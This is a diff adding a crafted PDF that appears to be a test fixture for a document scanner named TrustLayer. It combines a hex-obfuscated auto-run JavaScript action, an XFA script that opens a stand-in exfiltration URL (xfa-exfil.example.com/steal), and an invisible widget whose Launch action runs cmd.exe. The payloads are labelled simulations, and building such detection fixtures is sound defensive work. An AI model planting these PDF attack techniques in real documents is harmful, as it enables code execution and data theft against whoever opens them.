@@ -1,0 +1,62 @@
+%PDF-1.7
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R
+   /OpenAction << /Type /Action /S /#4A#61#76#61#53#63#72#69#70#74
+     /JS <FEFF540072007500730074004C0061007900650072002000540065007300740000>
+   >>
+   /AcroForm << /XFA 6 0 R >>
+>>
+endobj
+
+2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
+
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
+   /Annots [7 0 R]
+   /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >>
+>>
+endobj
+
+4 0 obj << /Length 80 >>
+stream
+BT /F1 10 Tf 50 750 Td (TrustLayer Obfuscation Test - Hex-encoded JS action above) Tj ET
+endstream
+endobj
+
+5 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Courier >> endobj
+
+6 0 obj
+<< /Length 312 >>
+stream
+<?xml version="1.0" encoding="UTF-8"?>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <config><present><pdf><interactive>1</interactive></pdf></present></config>
+  <template><subform><field><event activity="initialize">
+    <script contentType="application/x-javascript">
+      /* XFA JS - SIMULATION */
+      xfa.host.messageBox("TrustLayer: XFA JavaScript triggered");
+      xfa.host.openURL("http://xfa-exfil.example.com/steal");
+    </script>
+  </event></field></subform></template>
+</xdp:xdp>
+endstream
+endobj
+
+7 0 obj
+<< /Type /Annot /Subtype /Widget /Rect [0 0 0 0]
+   /FT /Btn /T (LAUNCH_TEST)
+   /AA << /U << /Type /Action /S /Launch
+     /F << /Type /Filespec /F (cmd.exe) /P (/c calc.exe) >>
+     /Win << /F (SIMULATION_cmd.exe) /P (/c SIMULATION_payload) /O (open) >>
+   >> >>
+>>
+endobj
+
+xref
+0 8
+0000000000 65535 f
+trailer << /Size 8 /Root 1 0 R >>
+startxref
+9
+%%EOF
